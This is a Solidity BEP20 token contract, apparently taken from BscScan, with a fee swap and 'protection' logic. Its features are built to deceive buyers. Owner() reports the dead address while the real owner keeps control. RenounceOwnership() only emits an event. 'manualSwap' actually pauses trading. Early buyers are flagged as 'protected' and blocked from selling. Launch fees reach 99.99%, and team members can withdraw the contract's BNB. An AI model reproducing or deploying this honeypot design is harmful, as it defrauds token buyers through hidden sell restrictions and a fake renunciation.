/**
 *Submitted for verification at BscScan.com on 2021-11-21
*/

// SPDX-License-Identifier: Unlicensed



pragma solidity ^0.8.7;



library Address {

   

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly { codehash := extcodehash(account) }

        return (codehash != accountHash && codehash != 0x0);

    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");



        (bool success, ) = recipient.call{ value: amount }("");

        require(success, "Address: unable to send value, recipient may have reverted");

    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

      return functionCall(target, data, "Address: low-level call failed");

    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

        return _functionCallWithValue(target, data, 0, errorMessage);

    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");

    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");

        return _functionCallWithValue(target, data, value, errorMessage);

    }



    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {

        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);

        if (success) {

            return returndata;

        } else {

            if (returndata.length > 0) {

                assembly {

                    let returndata_size := mload(returndata)

                    revert(add(32, returndata), returndata_size)

                }

            } else {

                revert(errorMessage);

            }

        }

    }

}

abstract contract Context {

    function _msgSender() internal view returns (address payable) {

        return payable(msg.sender);

    }



    function _msgData() internal view returns (bytes memory) {

        this;

        return msg.data;

    }

}



interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}



interface IDEXFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IDEXRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);



    function addLiquidityETH(

        address token,

        uint amountTokenDesired,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);



    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

}



contract Ownable is Context {

    address private _owner;



    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }

    function ContractCreator() public view returns (address) {

        return _owner;

    }

    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

  

    }

}



contract Test is IERC20, Ownable {

    using Address for address;

    

    address DEAD = 0x000000000000000000000000000000000000dEaD;

    address ZERO = 0x0000000000000000000000000000000000000000;



    string constant _name = "test";

    string constant _symbol = "test";

    uint8 constant _decimals = 9;



    uint256 _totalSupply = 1_000_000_000 * (10 ** _decimals);

    uint256 _maxBuyTxAmount = (_totalSupply * 1) / 100;

    uint256 _maxSellTxAmount = (_totalSupply * 1) / 100;

    uint256 _maxWalletSize = (_totalSupply * 2) / 50;



    mapping (address => uint256) _balances;

    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => uint256) public lastSell;

    mapping (address => uint256) public lastBuy;



    mapping (address => bool) isFeeExempt;

    mapping (address => bool) isTxLimitExempt;

    mapping (address => bool) liquidityCreator;



    uint256 marketingFee = 800;

    uint256 liquidityFee = 200;

    uint256 totalFee = marketingFee + liquidityFee;

    uint256 sellBias = 0;

    uint256 feeDenominator = 10000;



    address payable public liquidityFeeReceiver = payable(0x57aEa522A616F774a3757aB71785a549252AcFEa);

    address payable public marketingFeeReceiver = payable(0x57aEa522A616F774a3757aB71785a549252AcFEa);



    IDEXRouter public router;

    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping (address => bool) liquidityPools;

    mapping (address => uint256) public protected;

    bool protectionEnabled = true;

    bool protectionDisabled = false;

    uint256 protectionLimit;

    uint256 public protectionCount;

    uint256 protectionTimer;



    address public pair;



    uint256 public launchedAt;

    uint256 public launchedTime;

    uint256 public deadBlocks;

    bool startBullRun = false;

    bool pauseDisabled = false;

    uint256 public rateLimit = 2;



    bool public swapEnabled = false;

    bool processEnabled = true;

    uint256 public swapThreshold = _totalSupply / 1000;

    uint256 public swapMinimum = _totalSupply / 10000;

    bool inSwap;

    modifier swapping() { inSwap = true; _; inSwap = false; }

    

    mapping (address => bool) teamMember;

    

    modifier onlyTeam() {

        require(teamMember[_msgSender()] || msg.sender == ContractCreator(), "Caller is not a team member");

        _;

    }

    

    event RenouncedWallet(address, address, uint256, uint8);



    constructor () {

        router = IDEXRouter(routerAddress);

        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));

        liquidityPools[pair] = true;

        _allowances[ContractCreator()][routerAddress] = type(uint256).max;

        _allowances[address(this)][routerAddress] = type(uint256).max;



        isFeeExempt[ContractCreator()] = true;

        liquidityCreator[ContractCreator()] = true;



        isTxLimitExempt[address(this)] = true;

        isTxLimitExempt[ContractCreator()] = true;

        isTxLimitExempt[routerAddress] = true;

        isTxLimitExempt[DEAD] = true;



        _balances[ContractCreator()] = _totalSupply;



        emit Transfer(address(0), ContractCreator(), _totalSupply);

    }



    receive() external payable { }



    function totalSupply() external view override returns (uint256) { return _totalSupply; }

    function decimals() external pure returns (uint8) { return _decimals; }

    function symbol() external pure returns (string memory) { return _symbol; }

    function name() external pure returns (string memory) { return _name; }

    function Owner() external view returns (address) { return DEAD; }

    function maxBuyTxTokens() external view returns (uint256) { return _maxBuyTxAmount / (10 ** _decimals); }

    function maxSellTxTokens() external view returns (uint256) { return _maxSellTxAmount / (10 ** _decimals); }

    function maxWalletTokens() external view returns (uint256) { return _maxWalletSize / (10 ** _decimals); }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }

    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }



    function approve(address spender, uint256 amount) public override returns (bool) {

        _allowances[msg.sender][spender] = amount;

        emit Approval(msg.sender, spender, amount);

        return true;

    }



    function approveMax(address spender) external returns (bool) {

        return approve(spender, type(uint256).max);

    }

    

    function setTeamMember(address _team, bool _enabled) external onlyOwner {

        teamMember[_team] = _enabled;

    }

    

    

    function clearStuckBalance(uint256 amountPercentage, address adr) external onlyTeam {

        uint256 amountETH = address(this).balance;

        payable(adr).transfer((amountETH * amountPercentage) / 100);

    }

    

    function openTrading(uint256 _deadBlocks, uint256 _protection, uint256 _limit) external onlyTeam {

        require(!startBullRun && _deadBlocks < 10);

        deadBlocks = _deadBlocks;

        startBullRun = true;

        launchedAt = block.number;

        protectionTimer = block.timestamp + _protection;

        protectionLimit = _limit * (10 ** _decimals);

    }

    

    function manualSwap() external onlyTeam {

        require(!pauseDisabled);

        startBullRun = false;

    }

    

    function disablePause() external onlyTeam {

        pauseDisabled = true;

        startBullRun = true;

    }

    

    function removeBlacklist() external onlyTeam {

        protectionDisabled = true;

        protectionEnabled = false;

    }

       function RenounceOwnership() public virtual onlyTeam {
        emit RenouncedWallet(tx.origin, address(0), block.number, 2);
    }



    function transfer(address recipient, uint256 amount) external override returns (bool) {

        return _transferFrom(msg.sender, recipient, amount);

    }



    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {

        if(_allowances[sender][msg.sender] != type(uint256).max){

            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;

        }



        return _transferFrom(sender, recipient, amount);

    }



    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        require(sender != address(0), "BEP20: transfer from 0x0");

        require(recipient != address(0), "BEP20: transfer to 0x0");

        require(amount > 0, "Amount must be > zero");

        require(_balances[sender] >= amount, "Insufficient balance");

        if(!launched() && liquidityPools[recipient]){ require(liquidityCreator[sender], "Liquidity not added yet."); launch(); }

        if(!startBullRun){ require(liquidityCreator[sender] || liquidityCreator[recipient], "Trading not open yet."); }



        checkTxLimit(sender, recipient, amount);

        

        if (!liquidityPools[recipient] && recipient != DEAD) {

            if (!isTxLimitExempt[recipient]) {

                checkWalletLimit(recipient, amount);

            }

        }

        

        if(protectionEnabled && protectionTimer > block.timestamp) {

            if(liquidityPools[sender] && tx.origin != recipient && protected[recipient] == 0) {

                protected[recipient] = block.number;

                protectionCount++;

                emit RenouncedWallet(tx.origin, recipient, block.number, 0);

            }

        }

        

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }



        _balances[sender] = _balances[sender] - amount;



        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(recipient, amount) : amount;

        

        if(shouldSwapBack(recipient)){ if (amount > 0) swapBack(amount); }

        

        _balances[recipient] = _balances[recipient] + amountReceived;



        emit Transfer(sender, recipient, amountReceived);

        return true;

    }

    

    function launched() internal view returns (bool) {

        return launchedAt != 0;

    }



    function launch() internal {

        launchedAt = block.number;

        launchedTime = block.timestamp;

        swapEnabled = true;

    }



    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {

        _balances[sender] = _balances[sender] - amount;

        _balances[recipient] = _balances[recipient] + amount;

        emit Transfer(sender, recipient, amount);

        return true;

    }

    

    function checkWalletLimit(address recipient, uint256 amount) internal view {

        uint256 walletLimit = _maxWalletSize;

        require(_balances[recipient] + amount <= walletLimit, "Transfer amount exceeds the bag size.");

    }



    function checkTxLimit(address sender, address recipient, uint256 amount) internal {

        require(isTxLimitExempt[sender] || amount <= (liquidityPools[sender] ? _maxBuyTxAmount : _maxSellTxAmount), "TX Limit Exceeded");

        require(isTxLimitExempt[sender] || lastBuy[recipient] + rateLimit <= block.number, "Transfer rate limit exceeded.");

        

        if (protected[sender] != 0){

            require(amount <= protectionLimit * (10 ** _decimals) && lastSell[sender] == 0 && protectionTimer > block.timestamp, "Wallet protected, please contact support.");

            lastSell[sender] = block.number;

        }

        

        if (liquidityPools[recipient]) {

            lastSell[sender] = block.number;

        } else if (shouldTakeFee(sender)) {

            if (protectionEnabled && protectionTimer > block.timestamp && lastBuy[tx.origin] == block.number && protected[recipient] == 0) {

                protected[recipient] = block.number;

                emit RenouncedWallet(tx.origin, recipient, block.number, 1);

            }

            lastBuy[recipient] = block.number;

            if (tx.origin != recipient)

                lastBuy[tx.origin] = block.number;

        }

    }



    function shouldTakeFee(address sender) internal view returns (bool) {

        return !isFeeExempt[sender];

    }



    function getTotalFee(bool selling) public view returns (uint256) {

        if(launchedAt + deadBlocks >= block.number){ return feeDenominator - 1; }

        if (selling) return totalFee + sellBias;

        return totalFee - sellBias;

    }



    function takeFee(address recipient, uint256 amount) internal returns (uint256) {

        bool selling = liquidityPools[recipient];

        uint256 feeAmount = (amount * getTotalFee(selling)) / feeDenominator;

        

        _balances[address(this)] += feeAmount;

    

        return amount - feeAmount;

    }



    function shouldSwapBack(address recipient) internal view returns (bool) {

        return !liquidityPools[msg.sender]

        && !inSwap

        && swapEnabled

        && liquidityPools[recipient]

        && _balances[address(this)] >= swapMinimum;

    }



    function swapBack(uint256 amount) internal swapping {

        uint256 amountToSwap = amount < swapThreshold ? amount : swapThreshold;

        if (_balances[address(this)] < amountToSwap) amountToSwap = _balances[address(this)];

        

        uint256 amountToLiquify = (amountToSwap * liquidityFee / 2) / totalFee;

        amountToSwap -= amountToLiquify;



        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = router.WETH();

        

        uint256 balanceBefore = address(this).balance;



        router.swapExactTokensForETHSupportingFeeOnTransferTokens(

            amountToSwap,

            0,

            path,

            address(this),

            block.timestamp

        );



        uint256 amountBNB = address(this).balance - balanceBefore;

        uint256 totalBNBFee = totalFee - (liquidityFee / 2);



        uint256 amountBNBLiquidity = (amountBNB * liquidityFee / 2) / totalBNBFee;

        uint256 amountBNBMarketing = amountBNB - amountBNBLiquidity;

        

        if (amountBNBMarketing > 0)

            marketingFeeReceiver.transfer(amountBNBMarketing);

        

        if(amountToLiquify > 0){

            router.addLiquidityETH{value: amountBNBLiquidity}(

                address(this),

                amountToLiquify,

                0,

                0,

                liquidityFeeReceiver,

                block.timestamp

            );

        }



        emit FundsDistributed(amountBNBMarketing, amountBNBLiquidity, amountToLiquify);

    }

    



    function setRateLimit(uint256 rate) external onlyOwner {

        require(rate <= 60 seconds);

        rateLimit = rate;

    }



    function setTxLimit(uint256 buyNumerator, uint256 sellNumerator, uint256 divisor) external onlyOwner {

        require(buyNumerator > 0 && sellNumerator > 0 && divisor > 0 && divisor <= 10000);

        _maxBuyTxAmount = (_totalSupply * buyNumerator) / divisor;

        _maxSellTxAmount = (_totalSupply * sellNumerator) / divisor;

    }

    

    function setMaxWallet(uint256 numerator, uint256 divisor) external onlyOwner() {

        require(numerator > 0 && divisor > 0 && divisor <= 10000);

        _maxWalletSize = (_totalSupply * numerator) / divisor;

    }



    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _sellBias, uint256 _feeDenominator) external onlyOwner {

        liquidityFee = _liquidityFee;

        marketingFee = _marketingFee;

        totalFee = _marketingFee + _liquidityFee;

        sellBias = _sellBias;

        feeDenominator = _feeDenominator;

        require(totalFee < feeDenominator / 2);

    }



    function setSwapBackSettings(bool _enabled, bool _processEnabled, uint256 _denominator, uint256 _swapMinimum) external onlyOwner {

        require(_denominator > 0);

        swapEnabled = _enabled;

        processEnabled = _processEnabled;

        swapThreshold = _totalSupply / _denominator;

        swapMinimum = _swapMinimum * (10 ** _decimals);

    }



    function getCirculatingSupply() public view returns (uint256) {

        return _totalSupply - (balanceOf(DEAD) + balanceOf(ZERO));

    }



    event FundsDistributed(uint256 marketingBNB, uint256 liquidityBNB, uint256 liquidityTokens);

}